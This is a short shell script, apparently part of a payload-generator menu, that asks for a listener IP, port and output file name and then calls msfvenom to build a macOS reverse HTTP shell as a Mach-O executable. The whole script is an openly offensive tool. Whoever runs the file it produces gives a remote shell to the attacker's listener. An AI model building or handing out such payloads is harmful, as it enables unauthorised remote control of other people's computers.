	echo "Platform : Mac OX/Reverse HTTP Shell \n"

	echo -n "Enter Listener IP: "
	read IP
	echo Using IP : $IP

	echo -n "Enter Listener Port: "
  read PORT
	echo Using Port : $PORT

	echo -n "Where Should I Say The Output?: "
	read OUTPUT
	echo Saving TO $OUTPUT
	msfvenom -p osx/x86/shell_reverse_http LHOST=$IP LPORT=$PORT -f macho > $OUTPUT
